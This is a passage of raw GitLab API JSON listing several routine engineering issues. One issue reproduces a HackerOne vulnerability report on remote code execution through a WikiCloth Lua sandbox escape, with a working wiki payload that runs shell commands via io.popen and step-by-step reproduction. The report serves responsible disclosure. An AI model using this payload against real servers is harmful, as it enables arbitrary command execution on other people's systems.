UUIDs from a completed scan.\n   1. Pass these UUIDs to a new vulnerability resolution service. This service will take the projects existing \nCluster Image Scanning vulnerabilities, and resolve the ones which were not detected in the latest scan (`resolve(existing_uuids - new_uuids)`)\n   1. See [IngestReportsService](https://gitlab.com/gitlab-org/gitlab/-/blob/5f617d55b61fceb430de91cfcee6f1fee4c258ce/ee/app/services/security/ingestion/ingest_reports_service.rb#L42) for an implementation reference.\n1. ~backend (agentk) Have agentk perform the vulnerability resolution\n   1. As Agentk creates vulnerabilities, it will collect each UUID from the response and push it to a list.\n   1. When the scan is done, it will send a request with the list of UUIDs to `internal/kubernetes/modules/starboard_vulnerability/scan_result`\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-11-17T13:21:17.294Z","updated_at":"2022-03-14T03:25:50.953Z","closed_at":"2022-03-09T14:43:16.278Z","closed_by":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"labels":["Category:Container Scanning","backend","devops::govern","feature::addition","group::security policies","missed:14.8","section::sec","type::feature","workflow::in dev"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":null,"user_notes_count":15,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345905","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":7,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 7 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345905","notes":"https://gitlab.com/api/v4/projects/278964/issues/345905/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345905/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345905","relative":"#345905","full":"gitlab-org/gitlab#345905"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3410,"epic":{"id":59230,"iid":3410,"title":"Cluster Image Scanning (Vulnerability Scans against Running Containers)","url":"/groups/gitlab-org/-/epics/3410","group_id":9970,"human_readable_end_date":"Dec 13, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97479659,"iid":345900,"project_id":278964,"title":"The Cluster Image Scanning Analyzer should trigger new scans when it runs","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nPer https://gitlab.com/gitlab-org/gitlab/-/issues/341358#note_735118051. Currently, the Cluster Image Scanning analyzer expects that the Starboard Operator is responsible for executing all scans. This is a problem since we're trying to use scan execution policies to enforce scans (implemented in https://gitlab.com/gitlab-org/gitlab/-/issues/330714) and they do not currently do so. In order for the policy to enforce scans, the analyzer should trigger new scans when it runs.\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\nThe scan procedure is essentially the one described in https://gitlab.com/gitlab-org/gitlab/-/issues/349791#scanning (\"Scanning\").\n\n- [ ] ~backend Query Kubernetes for the [same workload kinds](https://github.com/aquasecurity/starboard/blob/caee8d91738eaffb6dd7a278824b8efd79b726e6/pkg/operator/controller/vulnerabilityreport.go#L50) as Starboard, taking into account the namespace filter configuration of the Agent.\n- [ ] ~backend` For every identified workload object, initiate a scan with `vulnerabilityreport.Scan `. The number of scans executing in parallel must be limited. Collect all resulting `v1alpha1.VulnerabilityReport`s.\n- [ ] ~backend Merge the resulting vulnerability reports.\n- [ ] ~backend Write the resulting report artifact.\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-11-17T12:14:54.373Z","updated_at":"2022-05-06T15:22:16.612Z","closed_at":"2022-03-21T22:26:02.014Z","closed_by":{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},"labels":["Category:Container Scanning","[deprecated] Accepting merge requests","backend","devops::govern","feature::enhancement","group::security policies","section::sec","type::feature","won't do","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":null,"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345900","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345900","notes":"https://gitlab.com/api/v4/projects/278964/issues/345900/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345900/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345900","relative":"#345900","full":"gitlab-org/gitlab#345900"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6771,"epic":{"id":351102,"iid":6771,"title":"Simplify Cluster Image Scanning Setup","url":"/groups/gitlab-org/-/epics/6771","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97479655,"iid":345899,"project_id":278964,"title":"Spike: Service Ping Alerts for Business Critical Metrics MVC","description":"Complete a spike to find out\n1. How we can gather business critical metrics - AR: Let's define this as any xMAU metrics\n1. Monitor them reliable\n1. Don't create false alerts\n1. If doable: Build a simple prototype","state":"closed","created_at":"2021-11-17T12:14:44.940Z","updated_at":"2022-06-29T14:59:40.381Z","closed_at":"2022-06-29T14:59:37.404Z","closed_by":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"labels":["Category:Product Analytics","Category:Service Ping","PI System Reliability and Monitoring","[deprecated] Accepting merge requests","auto updated","backend","devops::analytics","group::product intelligence","section::analytics","spike"],"milestone":null,"assignees":[],"author":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345899","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345899","notes":"https://gitlab.com/api/v4/projects/278964/issues/345899/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345899/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345899","relative":"#345899","full":"gitlab-org/gitlab#345899"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7031,"epic":{"id":378922,"iid":7031,"title":"Service Ping Alerts for Business Critical Metrics MVC","url":"/groups/gitlab-org/-/epics/7031","group_id":9970,"human_readable_end_date":"Jun 22, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97472216,"iid":345892,"project_id":278964,"title":"RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed","description":"**[HackerOne report #1401444](https://hackerone.com/reports/1401444)** by `vakzz` on 2021-11-16, assigned to @cmaxim:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nOne of the supported wiki formats is `mediawiki` which is rendered by `WikiCloth` via GitLab Markup:\n\nhttps://gitlab.com/gitlab-org/gitlab-markup/-/blob/v1.7.1/lib/github/markups.rb#L24-28  \n```ruby  \nmarkup(:wikicloth, /mediawiki|wiki/) do |content|  \n  wikicloth = WikiCloth::WikiCloth.new(:data =\u003e content)  \n  WikiCloth::WikiBuffer::HTMLElement::ESCAPED_TAGS \u003c\u003c 'tt'  \n  wikicloth.to_html(:noedit =\u003e true)  \nend  \n```\n\nOne of the extensions that `WikiCloth` has is for lua (eg [lua.wiki](https://github.com/nricciar/wikicloth/blob/v0.8.1/sample_documents/lua.wiki)), which allows lua code to be run and the results rendered inside of the page by using either `{{#luaexpr:lua expression}}` or `\u003clua\u003elua code here\u003c/lua\u003e`. This extension is enabled if the `rubyluabridge` gem can be required:\n\nhttps://github.com/nricciar/wikicloth/blob/v0.8.1/lib/wikicloth/extensions/lua.rb#L1-L6  \n```ruby  \nbegin  \n  require 'rubyluabridge'  \n  DISABLE_LUA = false  \nrescue LoadError  \n  DISABLE_LUA = true  \nend  \n```\n\nThe lua code is meant to be executed in a sandbox, but looking at the [lua wiki on sandboxing](http://lua-users.org/wiki/SandBoxes#:~:text=loadstring%20--%20UNSAFE.%20See%20load.%20Even%20this%3A) one of the things mentioned is:\n\n\u003e loadstring -- UNSAFE. See load. Even this isn't safe. For example, `pcall(safeloadstring, some_script)` will load some_script in global environment. --SergeyRozhenko\n\n```lua  \nlocal oldloadstring = loadstring  \nlocal function safeloadstring(s, chunkname)  \n  local f, message = oldloadstring(s, chunkname)  \n  if not f then  \n    return f, message  \n  end  \n  setfenv(f, getfenv(2))  \n  return f  \nend  \n```\n\nThis is the exact code that `WikiCloth` is using in their wrapper https://github.com/nricciar/wikicloth/blob/master/lib/wikicloth/extensions/lua/luawrapper.lua#L83-L92, so the provided bypass can be used to execute arbitrary lua:\n\n```  \n\u003clua\u003e  \n_,execute = pcall(loadstring,  \n    [[  \n        local command = ...;  \n        local handle = io.popen(command)  \n        local result = handle:read(\"*a\")  \n        handle:close()  \n        return result;  \n    ]]  \n);\n\nprint(execute('id'));  \nexecute('echo vakzz \u003e /tmp/ggg');  \n\u003c/lua\u003e  \n```\n\nLuckily it's pretty unlikely that the `rubyluabridge` gem will be installed. There is a current ubuntu package https://packages.ubuntu.com/bionic/ruby/ruby-luabridge that can just be installed with apt, or a rubygem version at https://rubygems.org/gems/Tamar. Potentially another gem could start depending on it, or if gitlab is [installed from source](https://docs.gitlab.com/ee/install/installation.html) and the ruby environment is shared, the apt version could be present.\n\n#####  Steps to reproduce\n\n1. Install the `rubyluabridge` gem  \n  * If using the omnibus edition then you will need to do something like the following to get it in the correct spot:  \n```  \ncurl -sSL https://get.rvm.io | bash  \nsource /etc/profile.d/rvm.sh  \nrvm install 2.7.4\n\ngit clone https://github.com/neomantra/rubyluabridge  \nsudo apt install liblua5.1-0-dev libboost-dev  \n./build/extconf_ubuntu.sh  \nmake\n\nsudo cp rubyluabridge.so /opt/gitlab/embedded/lib/ruby/2.7.0/rubyluabridge.so  \n```  \n2. Create a new project and add a wiki page  \n3. Clone the wiki (clone url should end in `.wiki.git`)  \n4. Create a file `hello.wiki` with the following contents:  \n```  \n\u003clua\u003e  \n_,execute = pcall(loadstring,  \n    [[  \n        local command = ...;  \n        local handle = io.popen(command)  \n        local result = handle:read(\"*a\")  \n        handle:close()  \n        return result;  \n    ]]  \n);\n\nprint(execute('id'));  \nexecute('echo vakzz \u003e /tmp/ggg');  \n\u003c/lua\u003e  \n```  \n5. Add, commit and push the file  \n6. Visit the new wiki page on gitlab, you should see the output of the `id` command  \n7. See that the file `/tmp/ggg` has been created\n\n![wiki.png](https://h1.sec.gitlab.net/a/63701ca7-25cf-4f12-99c4-68b7c02a2660/wiki.png)\n\n#####  Impact  \nIf the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server \n\n#####  What is the current *bug* behavior?  \nThe lua sandbox can be escaped using code from the official wiki.\n\n#####  What is the expected *correct* behavior?  \nProbably all of the WikiCloth extensions should be disabled unless explicitly enabled, I cant really see a need for executing lua when rendering a wiki page.\n\n#####  Output of checks  \n######  Results of GitLab environment info\n\n####  Impact\n\nIf the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [wiki.png](https://h1.sec.gitlab.net/a/63701ca7-25cf-4f12-99c4-68b7c02a2660/wiki.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-11-17T10:10:01.879Z","updated_at":"2022-09-09T23:08:40.842Z","closed_at":"2022-01-12T08:07:01.133Z","closed_by":{"id":4985794,"username":"cwoolley-gitlab","name":"Chad Woolley","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4cf06f1fc667817854991b558103a9e2?s=80\u0026d=identicon","web_url":"https://gitlab.com/cwoolley-gitlab"},"labels":["HackerOne","Weakness::CWE-78","approaching-SLO","auto updated","backend","devops::create","frontend","group::editor","priority::2","quad-planning::complete-no-action","section::dev","security","severity::2","type::bug","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4985794,"username":"cwoolley-gitlab","name":"Chad Woolley","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4cf06f1fc667817854991b558103a9e2?s=80\u0026d=identicon","web_url":"https://gitlab.com/cwoolley-gitlab"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":4985794,"username":"cwoolley-gitlab","name":"Chad Woolley","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4cf06f1fc667817854991b558103a9e2?s=80\u0026d=identicon","web_url":"https://gitlab.com/cwoolley-gitlab"},"user_notes_count":23,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-12-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345892","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345892","notes":"https://gitlab.com/api/v4/projects/278964/issues/345892/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345892/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345892","relative":"#345892","full":"gitlab-org/gitlab#345892"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97447580,"iid":345856,"project_id":278964,"title":"HandlebarsDotNet memory leak","description":"### Problem\n\nDuring investigation of an OutOfMemory exception, it was noticed that references to the 3rd party HandlebarsDotNet library grew during a testing session impacting memory usage of the analyzer.\n\nDuring the investigation it was found a new version of HandlebarsDotNet fixes several memory leaks and lowers CPU usage.\n\n### Proposal\n\nUpgrade HandlebarsDotNet to most recent version (2.0.9)\n\nPrior to this change memory usage would be 2GB for our test service, after upgrade it drops below 1GB.\n\nTasks:\n\n1. [x] Upgrade dependency\n1. [x] Verify using memory profiler\n1. [x] Verify all tests pass\n1. [x] Release new container version","state":"closed","created_at":"2021-11-16T22:03:38.127Z","updated_at":"2021-11-18T17:27:54.465Z","closed_at":"2021-11-18T17:27:54.449Z","closed_by":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"labels":["Category:DAST","GitLab Ultimate","backend","devops::secure","group::dynamic analysis","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"}],"author":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"type":"ISSUE","assignee":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345856","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345856","notes":"https://gitlab.com/api/v4/projects/278964/issues/345856/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345856/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345856","relative":"#345856","full":"gitlab-org/gitlab#345856"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97445626,"iid":345854,"project_id":278964,"title":"Group namespace billing hand raise test improvement","description":"The following discussion from !74438 should be addressed:\n\n- [ ] @felipe_artur started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74438#note_734980863):  (+1 comment)\n\n    \u003e This is a bit weird. I only see one context falling into this condition. I would ask you to move into a separate spec there, but I understand this way we can save some time.","state":"closed","created_at":"2021-11-16T21:09:01.645Z","updated_at":"2022-03-14T04:36:43.413Z","closed_at":"2022-03-14T04:36:43.404Z","closed_by":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"labels":["devops::growth","good for new contributors","group::acquisition","section::growth","type::maintenance"],"milestone":null,"assignees":[],"author":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"type":"ISSUE","assignee":null,"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345854","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345854","notes":"https://gitlab.com/api/v4/projects/278964/issues/345854/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345854/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345854","relative":"#345854","full":"gitlab-org/gitlab#345854"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97443533,"iid":345850,"project_id":278964,"title":"License Compliance - Update text copy on tooltip dropdown","description":"Related Discussions:\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/74143#note_734021746\n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/34039#note_366197827\n\n## Description:\n\nUpdate text copy in dropdown to:\n\n\u003e Unacceptable license, if detected it will disallow a merge request until it's removed\n\n![https://gitlab.com/gitlab-org/gitlab/uploads/14fa548a19a0e75e9b3845f48fe60f93/Screen_Shot_2020-06-07_at_11.23.26_PM.png](https://gitlab.com/gitlab-org/gitlab/uploads/14fa548a19a0e75e9b3845f48fe60f93/Screen_Shot_2020-06-07_at_11.23.26_PM.png)","state":"closed","created_at":"2021-11-16T19:58:38.419Z","updated_at":"2021-11-22T03:21:56.467Z","closed_at":"2021-11-18T08:31:32.482Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["Category:License Compliance","GitLab Ultimate","UX","approvals","devops::secure","frontend","group::composition analysis","section::sec","security reports","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"}],"author":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345850","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":0,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345850","notes":"https://gitlab.com/api/v4/projects/278964/issues/345850/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345850/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345850","relative":"#345850","full":"gitlab-org/gitlab#345850"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97440143,"iid":345845,"project_id":278964,"title":"Remove test reports requirement_id column","description":"Remove `requirements_management_test_reports.requirement_id` column from database.  \n\nColumn should be already ignored on previous release.","state":"closed","created_at":"2021-11-16T18:28:35.982Z","updated_at":"2023-01-12T21:24:50.712Z","closed_at":"2022-05-06T12:28:57.541Z","closed_by":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"labels":["Category:Requirements Management","backend","devops::plan","group::certify","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"}],"author":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"type":"ISSUE","assignee":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345845","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345845","notes":"https://gitlab.com/api/v4/projects/278964/issues/345845/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345845/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345845","relative":"#345845","full":"gitlab-org/gitlab#345845"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7148,"epic":{"id":388159,"iid":7148,"title":"Migrate test reports to belong to work items","url":"/groups/gitlab-org/-/epics/7148","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97440132,"iid":345844,"project_id":278964,"title":"Ignore  test reports requirement_id column","description":"Ignore `requirements_management_test_reports.requirement_id` column to \nmake sure it can be removed in the next release.","state":"closed","created_at":"2021-11-16T18:28:15.838Z","updated_at":"2023-01-12T21:24:50.668Z","closed_at":"2022-03-07T13:19:10.987Z","closed_by":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"labels":["Category:Requirements Management","Stretch","backend","devops::plan","group::certify","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"}],"author":{"id":426128,"username":"felipe_artur","name":"Felipe 